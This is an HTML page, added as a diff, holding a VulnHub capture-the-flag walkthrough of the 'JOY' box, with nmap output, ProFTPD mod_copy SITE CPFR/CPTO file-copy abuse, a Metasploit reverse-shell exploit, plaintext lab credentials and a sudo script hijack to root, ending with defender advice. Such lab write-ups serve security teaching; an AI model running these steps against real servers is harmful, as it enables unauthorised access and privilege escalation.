@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Digitalworld.local: JOY — Walkthrough by Ownuh</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,600;1,300&display=swap');
+
+  :root {
+    --bg:        #060b0f;
+    --surface:   #0d1a14;
+    --border:    #1a3a28;
+    --green:     #00ff88;
+    --green-dim: #00a855;
+    --green-xs:  #003320;
+    --amber:     #ffb300;
+    --red:       #ff3c5a;
+    --text:      #b8d4c0;
+    --muted:     #4a7a5a;
+    --white:     #e8f5ec;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 14px;
+    line-height: 1.8;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── scanline overlay ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,136,0.015) 2px,
+      rgba(0,255,136,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── grid bg ── */
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.04) 1px, transparent 1px);
+    background-size: 48px 48px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  main {
+    position: relative;
+    z-index: 1;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 60px 24px 120px;
+  }
+
+  /* ── header ── */
+  .hero {
+    border-left: 3px solid var(--green);
+    padding: 0 0 0 24px;
+    margin-bottom: 64px;
+    animation: fadeIn 0.8s ease both;
+  }
+
+  .hero-label {
+    font-family: 'Share Tech Mono', monospace;
+    color: var(--green);
+    font-size: 11px;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    opacity: 0.7;
+  }
+
+  .hero h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(22px, 4vw, 36px);
+    font-weight: 900;
+    color: var(--white);
+    line-height: 1.15;
+    margin-bottom: 16px;
+  }
+
+  .hero h1 span { color: var(--green); }
+
+  .hero-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin-top: 20px;
+  }
+
+  .hero-meta span { color: var(--green-dim); }
+
+  .tagline {
+    font-family: 'IBM Plex Mono', monospace;
+    font-style: italic;
+    font-size: 13px;
+    color: var(--muted);
+    margin-top: 18px;
+    border-top: 1px solid var(--border);
+    padding-top: 14px;
+  }
+
+  .tagline em { color: var(--green); font-style: normal; }
+
+  /* ── methodology map ── */
+  .method-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 12px;
+    margin-bottom: 56px;
+    animation: fadeIn 0.9s 0.2s ease both;
+  }
+
+  .method-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 16px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .method-card:hover { border-color: var(--green-dim); }
+
+  .method-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--green);
+  }
+
+  .method-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    color: var(--green);
+    opacity: 0.5;
+    margin-bottom: 6px;
+  }
+
+  .method-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--white);
+    margin-bottom: 4px;
+  }
+
+  .method-detail {
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  /* ── section headers ── */
+  .section {
+    margin-bottom: 56px;
+    animation: fadeIn 0.8s ease both;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 24px;
+  }
+
+  .section-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    color: var(--green);
+    opacity: 0.6;
+    min-width: 28px;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--white);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  /* ── prose ── */
+  .prose {
+    color: var(--text);
+    line-height: 1.9;
+    margin-bottom: 20px;
+  }
+
+  .prose strong { color: var(--green); font-weight: 600; }
+  .prose em { color: var(--amber); font-style: italic; }
+
+  /* ── attacker insight box ── */
+  .insight {
+    background: var(--green-xs);
+    border: 1px solid var(--green-dim);
+    border-left: 3px solid var(--green);
+    padding: 16px 20px;
+    margin: 20px 0;
+    font-size: 13px;
+    color: var(--white);
+  }
+
+  .insight-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--green);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  /* ── terminal blocks ── */
+  .terminal {
+    background: #020706;
+    border: 1px solid var(--border);
+    margin: 20px 0;
+    overflow: hidden;
+  }
+
+  .terminal-bar {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .dot { width: 8px; height: 8px; border-radius: 50%; }
+  .dot-r { background: #ff3c5a; }
+  .dot-y { background: #ffb300; }
+  .dot-g { background: var(--green); }
+
+  .terminal-body {
+    padding: 18px 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    line-height: 2;
+    overflow-x: auto;
+  }
+
+  .prompt { color: var(--green); }
+  .cmd { color: var(--white); }
+  .output { color: var(--muted); }
+  .highlight { color: var(--amber); }
+  .cred { color: var(--red); }
+  .good { color: var(--green); }
+
+  /* ── finding tags ── */
+  .findings {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: 16px 0;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 10px;
+    border: 1px solid;
+    letter-spacing: 1px;
+  }
+
+  .tag-open { border-color: var(--amber); color: var(--amber); }
+  .tag-vuln { border-color: var(--red); color: var(--red); }
+  .tag-win  { border-color: var(--green); color: var(--green); }
+
+  /* ── phase divider ── */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin: 40px 0 32px;
+    opacity: 0.4;
+  }
+
+  .divider-line { flex: 1; height: 1px; background: var(--border); }
+  .divider-icon { color: var(--green); font-size: 12px; }
+
+  /* ── key-value table ── */
+  .kv-table { width: 100%; border-collapse: collapse; margin: 16px 0; }
+  .kv-table td {
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+  }
+  .kv-table td:first-child { color: var(--muted); width: 38%; }
+  .kv-table td:last-child { color: var(--white); }
+  .kv-table tr:hover td { background: var(--surface); }
+
+  /* ── footer ── */
+  .footer {
+    margin-top: 80px;
+    border-top: 1px solid var(--border);
+    padding-top: 32px;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    align-items: flex-end;
+    gap: 20px;
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .footer-sig {
+    font-family: 'Orbitron', monospace;
+    color: var(--green);
+    font-size: 13px;
+  }
+
+  .footer-tagline {
+    font-style: italic;
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 4px;
+  }
+
+  /* ── animations ── */
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50%       { opacity: 0; }
+  }
+
+  .cursor {
+    display: inline-block;
+    width: 8px; height: 14px;
+    background: var(--green);
+    vertical-align: middle;
+    margin-left: 2px;
+    animation: blink 1s step-end infinite;
+  }
+
+  /* ── responsive ── */
+  @media (max-width: 600px) {
+    .hero h1 { font-size: 20px; }
+    .terminal-body { font-size: 11px; }
+  }
+</style>
+</head>
+<body>
+<main>
+
+  <!-- ══════════ HERO ══════════ -->
+  <header class="hero">
+    <p class="hero-label">VulnHub CTF — Boot2Root Walkthrough</p>
+    <h1>Digitalworld.local: <span>JOY</span></h1>
+    <p class="tagline">
+      "Every open port is a question. Every misconfiguration is an answer.<br>
+      <em>I design systems assuming they will be attacked — and make sure they survive.</em>"
+    </p>
+    <div class="hero-meta">
+      <div>Author <span>Ownuh (Leona Kokerai)</span></div>
+      <div>Difficulty <span>Intermediate</span></div>
+      <div>Objective <span>Root Shell</span></div>
+      <div>Target <span>192.168.1.104</span></div>
+    </div>
+  </header>
+
+  <!-- ══════════ METHODOLOGY ══════════ -->
+  <div class="method-grid">
+    <div class="method-card">
+      <div class="method-num">01</div>
+      <div class="method-title">Recon</div>
+      <div class="method-detail">Nmap full port + service scan</div>
+    </div>
+    <div class="method-card">
+      <div class="method-num">02</div>
+      <div class="method-title">Enumeration</div>
+      <div class="method-detail">Anonymous FTP — directory leak</div>
+    </div>
+    <div class="method-card">
+      <div class="method-num">03</div>
+      <div class="method-title">Lateral Move</div>
+      <div class="method-detail">ProFTPD SITE CPFR/CPTO abuse</div>
+    </div>
+    <div class="method-card">
+      <div class="method-num">04</div>
+      <div class="method-title">Initial Access</div>
+      <div class="method-detail">MSF mod_copy RCE → www-data</div>
+    </div>
+    <div class="method-card">
+      <div class="method-num">05</div>
+      <div class="method-title">PrivEsc</div>
+      <div class="method-detail">Sudo script hijack → root</div>
+    </div>
+  </div>
+
+
+  <!-- ══════════ SECTION 1: RECON ══════════ -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <span class="section-title">Reconnaissance</span>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      First thing I do on any target — map the surface. I'm not rushing toward exploitation; 
+      I want a picture of what this machine is exposing before I touch anything.
+      My mindset here: <strong>every open port is a decision someone made</strong>. 
+      Port 21 with anonymous login is not an accident — it's a gift.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        nmap — aggressive scan
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">ownuh@kali:~$</span> <span class="cmd">nmap -A 192.168.1.104</span></div>
+        <div class="output">Starting Nmap scan...</div>
+        <div>&nbsp;</div>
+        <div><span class="highlight">21/tcp   open  ftp</span>     <span class="output">ProFTPD 1.3.5</span></div>
+        <div class="good">  |_ Anonymous login: ALLOWED</div>
+        <div class="output">  |_ /upload  (rw)</div>
+        <div class="output">  |_ /download (r)</div>
+        <div><span class="output">22/tcp   open  ssh</span></div>
+        <div><span class="output">25/tcp   open  smtp</span></div>
+        <div><span class="output">80/tcp   open  http</span></div>
+        <div><span class="output">110/tcp  open  pop3</span></div>
+        <div><span class="output">139/tcp  open  netbios-ssn</span></div>
+        <div><span class="output">143/tcp  open  imap</span></div>
+        <div><span class="output">445/tcp  open  microsoft-ds</span></div>
+      </div>
+    </div>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      With this many ports open, the attack surface is wide — but not all surfaces are equal. 
+      I'm immediately drawn to FTP on 21. Anonymous login is enabled, which means someone 
+      configured this deliberately, or forgot to lock it down. Either way, I can read the 
+      filesystem without credentials. That changes everything.
+    </div>
+
+    <div class="findings">
+      <span class="tag tag-open">PORT 21 — ANON LOGIN</span>
+      <span class="tag tag-open">PORT 80 — HTTP</span>
+      <span class="tag tag-open">PORT 22 — SSH</span>
+      <span class="tag tag-vuln">PROFTPD 1.3.5 IDENTIFIED</span>
+    </div>
+  </section>
+
+
+  <!-- ══════════ SECTION 2: ENUMERATION ══════════ -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <span class="section-title">Enumeration</span>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      Anonymous FTP access means I can browse the exposed filesystem — no credentials required.
+      The layout immediately tells a story: <strong>/download</strong> is read-only, 
+      <strong>/upload</strong> is read-write. This asymmetry matters — it will become a 
+      pivot point later in the escalation chain.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        ftp — anonymous enumeration
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">ownuh@kali:~$</span> <span class="cmd">ftp 192.168.1.104</span></div>
+        <div class="output">Name: <span class="good">anonymous</span>  Password: (blank)</div>
+        <div class="good">230 Login successful.</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">ftp&gt;</span> <span class="cmd">ls</span></div>
+        <div class="output">drwxr-xr-x  download/</div>
+        <div class="output">drwxrwxrwx  upload/</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">ftp&gt;</span> <span class="cmd">cd download</span></div>
+        <div><span class="prompt">ftp&gt;</span> <span class="cmd">ls</span></div>
+        <div class="highlight">-rw-r--r--  directory</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">ftp&gt;</span> <span class="cmd">get directory</span></div>
+        <div class="good">226 Transfer complete.</div>
+      </div>
+    </div>
+
+    <p class="prose">
+      The file named <strong>directory</strong> is interesting. Not a script, not a binary — 
+      just a plain text listing of the server's filesystem structure. Someone left a map.
+      Reading it carefully, I find a reference to <em>Patrick's home directory</em> and a 
+      file called <strong>version_control</strong>. That name is suspicious. Version control 
+      files often expose software versions, paths, and deployment details.
+    </p>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      I can't read <code>/home/patrick/version_control</code> directly from FTP since it's 
+      outside the FTP root. But here's where I get creative: ProFTPD 1.3.5 supports 
+      <strong>SITE CPFR / SITE CPTO</strong> — server-side file copy commands. 
+      If I can copy Patrick's file into <code>/home/ftp/upload/</code> (which I can write to), 
+      I can retrieve it via FTP. The server becomes my exfiltration tool against itself.
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        telnet → ProFTPD SITE CPFR/CPTO — server-side file copy
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">ownuh@kali:~$</span> <span class="cmd">telnet 192.168.1.104 21</span></div>
+        <div class="good">220 ProFTPD 1.3.5 Server ready.</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">telnet&gt;</span> <span class="cmd">site cpfr /home/patrick/version_control</span></div>
+        <div class="good">350 File or directory exists, ready for destination name</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">telnet&gt;</span> <span class="cmd">site cpto /home/ftp/upload/version_control</span></div>
+        <div class="good">250 Copy successful</div>
+      </div>
+    </div>
+
+    <p class="prose">
+      Now I retrieve the copied file via FTP. The <strong>version_control</strong> file 
+      reveals two critical pieces of intelligence: the exact ProFTPD version running, 
+      and the webroot path — <em>/var/www/tryingharderisjoy</em>. 
+      That webroot path is my entry point for the exploit stage.
+    </p>
+
+    <table class="kv-table">
+      <tr><td>FTP Service Version</td><td>ProFTPD 1.3.5</td></tr>
+      <tr><td>Webroot Path</td><td>/var/www/tryingharderisjoy</td></tr>
+      <tr><td>FTP Upload Dir</td><td>/home/ftp/upload/</td></tr>
+      <tr><td>User of Interest</td><td>patrick</td></tr>
+    </table>
+  </section>
+
+
+  <!-- ══════════ SECTION 3: EXPLOITATION ══════════ -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <span class="section-title">Exploitation</span>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      ProFTPD 1.3.5 with mod_copy enabled is a well-documented vulnerability. 
+      The <strong>mod_copy module</strong> allows unauthenticated file copy operations —
+      meaning I can write a PHP webshell anywhere the FTP user has access to, including 
+      the webroot. Combined with the webroot path I extracted, this is a clean path to RCE.
+    </p>
+
+    <p class="prose">
+      I'll use Metasploit's <code>proftpd_modcopy_exec</code> module which automates this:
+      it copies a PHP payload into the webroot, then triggers it via HTTP to pop a shell.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        metasploit — proftpd_modcopy_exec
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">msf6&gt;</span> <span class="cmd">use exploit/unix/ftp/proftpd_modcopy_exec</span></div>
+        <div><span class="prompt">msf6 exploit&gt;</span> <span class="cmd">set RHOSTS 192.168.1.104</span></div>
+        <div><span class="prompt">msf6 exploit&gt;</span> <span class="cmd">set SITEPATH /var/www/tryingharderisjoy</span></div>
+        <div><span class="prompt">msf6 exploit&gt;</span> <span class="cmd">exploit</span></div>
+        <div>&nbsp;</div>
+        <div class="output">[*] Started reverse TCP handler on 192.168.1.10:4444</div>
+        <div class="output">[*] 192.168.1.104:21 - Connected to FTP server</div>
+        <div class="output">[*] Copying payload to /var/www/tryingharderisjoy/...</div>
+        <div class="output">[*] Triggering payload via HTTP...</div>
+        <div class="good">[*] Command shell session 1 opened</div>
+        <div>&nbsp;</div>
+        <div><span class="highlight">id</span></div>
+        <div class="good">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+      </div>
+    </div>
+
+    <p class="prose">
+      Shell as <strong>www-data</strong>. First thing I do is upgrade to a proper TTY — 
+      raw shells are painful to work in and easy to lose.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        tty upgrade + credential discovery
+      </div>
+      <div class="terminal-body">
+        <div><span class="cmd">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+        <div class="good">www-data@JOY:/$</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">www-data@JOY:/$</span> <span class="cmd">cat /ossec/patricksecretofjoy</span></div>
+        <div>&nbsp;</div>
+        <div class="cred">patrick : apollo098765</div>
+        <div class="cred">root    : howtheheckdoiknowwhattherootpasswordis</div>
+      </div>
+    </div>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      Credentials in plaintext inside an OSSEC directory is a notable finding. In a real 
+      engagement, this file path would be flagged immediately — OSSEC is a HIDS 
+      (Host-based Intrusion Detection System), so storing credentials inside it is 
+      deeply ironic. We now have Patrick's password. Rather than using root directly, 
+      I want to understand the privilege escalation surface first.
+    </div>
+
+    <div class="findings">
+      <span class="tag tag-win">SHELL OBTAINED — www-data</span>
+      <span class="tag tag-vuln">CREDENTIALS IN PLAINTEXT</span>
+      <span class="tag tag-win">PATRICK'S PASSWORD KNOWN</span>
+    </div>
+  </section>
+
+
+  <!-- ══════════ SECTION 4: PRIVILEGE ESCALATION ══════════ -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <span class="section-title">Privilege Escalation</span>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      I switch to Patrick and immediately check his <code>sudo</code> rights. 
+      This is always my first post-access check — sudo misconfigurations are one of the 
+      most common and most exploitable PrivEsc paths on Linux systems.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        sudo enumeration as patrick
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">www-data@JOY:/$</span> <span class="cmd">su patrick</span></div>
+        <div class="output">Password: apollo098765</div>
+        <div class="good">patrick@JOY:~$</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">patrick@JOY:~$</span> <span class="cmd">sudo -l</span></div>
+        <div>&nbsp;</div>
+        <div class="output">User patrick may run the following commands:</div>
+        <div class="highlight">    (root) NOPASSWD: /home/patrick/script/test</div>
+      </div>
+    </div>
+
+    <p class="prose">
+      Patrick can execute <code>/home/patrick/script/test</code> as root — no password required. 
+      The script itself does nothing useful. But here's the critical question I ask: 
+      <strong>can I replace it?</strong>
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        checking write permissions
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">patrick@JOY:~$</span> <span class="cmd">ls -la /home/patrick/script/</span></div>
+        <div class="output">drwxr-xr-x  2 root root  4096 script/</div>
+        <div class="output">-rwxr-xr-x  1 root root    22 test</div>
+        <div>&nbsp;</div>
+        <div class="highlight">Directory owned by root — no direct write access.</div>
+      </div>
+    </div>
+
+    <p class="prose">
+      The <code>/script/</code> directory is root-owned and not writable by Patrick. 
+      Direct replacement is blocked. But I already know the FTP service allows 
+      <strong>authenticated SITE CPFR/CPTO operations</strong>. Since the FTP server 
+      runs with elevated privileges, I can use it to copy files anywhere on the 
+      filesystem — including into Patrick's script directory. 
+      The FTP service becomes my privilege escalation primitive.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        craft payload → stage via FTP upload → deploy via CPFR/CPTO
+      </div>
+      <div class="terminal-body">
+        <div class="output"># Step 1: craft the malicious test script</div>
+        <div><span class="prompt">ownuh@kali:~$</span> <span class="cmd">echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test</span></div>
+        <div>&nbsp;</div>
+        <div class="output"># Step 2: upload it into FTP's writable /upload dir</div>
+        <div><span class="prompt">ownuh@kali:~$</span> <span class="cmd">ftp 192.168.1.104</span></div>
+        <div><span class="prompt">ftp&gt;</span> <span class="cmd">cd upload</span></div>
+        <div><span class="prompt">ftp&gt;</span> <span class="cmd">put test</span></div>
+        <div class="good">226 Transfer complete.</div>
+        <div>&nbsp;</div>
+        <div class="output"># Step 3: use ProFTPD SITE CPTO to move it into the script dir</div>
+        <div><span class="prompt">ownuh@kali:~$</span> <span class="cmd">telnet 192.168.1.104 21</span></div>
+        <div><span class="prompt">telnet&gt;</span> <span class="cmd">site cpfr /home/ftp/upload/test</span></div>
+        <div class="good">350 File exists, ready for destination name</div>
+        <div><span class="prompt">telnet&gt;</span> <span class="cmd">site cpto /home/patrick/script/test</span></div>
+        <div class="good">250 Copy successful</div>
+      </div>
+    </div>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      This is the elegant part: I didn't need a kernel exploit or a 0-day. 
+      I leveraged the same misconfiguration twice — once to read files, once to write them. 
+      The attacker's principle: <strong>find the one broken primitive and chain it 
+      as far as it will take you.</strong> Here, SITE CPFR/CPTO was that primitive.
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        triggering root shell
+      </div>
+      <div class="terminal-body">
+        <div><span class="prompt">patrick@JOY:~$</span> <span class="cmd">sudo /home/patrick/script/test</span></div>
+        <div>&nbsp;</div>
+        <div class="good">root@JOY:~#</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">root@JOY:~#</span> <span class="cmd">id</span></div>
+        <div class="good">uid=0(root) gid=0(root) groups=0(root)</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">root@JOY:~#</span> <span class="cmd">cd /root && ls</span></div>
+        <div class="highlight">proof.txt    author-secret.txt</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">root@JOY:/root#</span> <span class="cmd">cat proof.txt</span></div>
+        <div class="good">Congratulations! You've rooted JOY.<span class="cursor"></span></div>
+      </div>
+    </div>
+
+    <div class="findings">
+      <span class="tag tag-win">ROOT SHELL OBTAINED</span>
+      <span class="tag tag-win">PROOF.TXT CAPTURED</span>
+      <span class="tag tag-win">BOX COMPLETE</span>
+    </div>
+  </section>
+
+
+  <!-- ══════════ SECTION 5: LESSONS ══════════ -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <span class="section-title">Key Takeaways</span>
+      <div class="section-line"></div>
+    </div>
+
+    <p class="prose">
+      This box teaches one important lesson clearly: <strong>a single misconfiguration, 
+      chained creatively, can compromise an entire system.</strong> The ProFTPD mod_copy 
+      misconfiguration wasn't exploited once — it was the thread that ran through every 
+      phase: enumeration, lateral file access, exploitation, and privilege escalation.
+    </p>
+
+    <table class="kv-table">
+      <tr>
+        <td>Misconfiguration #1</td>
+        <td>Anonymous FTP — exposed filesystem readable without credentials</td>
+      </tr>
+      <tr>
+        <td>Misconfiguration #2</td>
+        <td>SITE CPFR/CPTO — unauthenticated server-side file copy (mod_copy)</td>
+      </tr>
+      <tr>
+        <td>Misconfiguration #3</td>
+        <td>Plaintext credentials stored in /ossec/ directory</td>
+      </tr>
+      <tr>
+        <td>Misconfiguration #4</td>
+        <td>Sudo NOPASSWD on a user-writable (via FTP pivot) script</td>
+      </tr>
+      <tr>
+        <td>Defender Recommendation</td>
+        <td>Disable mod_copy in ProFTPD; restrict anonymous FTP; never store credentials in filesystem; audit sudo rules for script paths</td>
+      </tr>
+    </table>
+
+    <div class="insight">
+      <div class="insight-label">Final Thought</div>
+      Real attackers don't need to break encryption or exploit memory corruption to own a box. 
+      Most breaches happen exactly like this: a forgotten config, a trusted tool misused, 
+      a file copied somewhere it shouldn't be. 
+      <strong>Find me before they find you.</strong>
+    </div>
+  </section>
+
+  <!-- ══════════ FOOTER ══════════ -->
+  <footer class="footer">
+    <div>
+      <div class="footer-sig">OWNUH — Leona Kokerai</div>
+      <div class="footer-tagline">Find me before they find you.</div>
+    </div>
+    <div style="text-align:right;">
+      <div>github.com/leeownuh</div>
+      <div style="margin-top:4px;">leeownuh.github.io/cv-resume-portfolio</div>
+    </div>
+  </footer>
+
+</main>
+</body>
+</html>
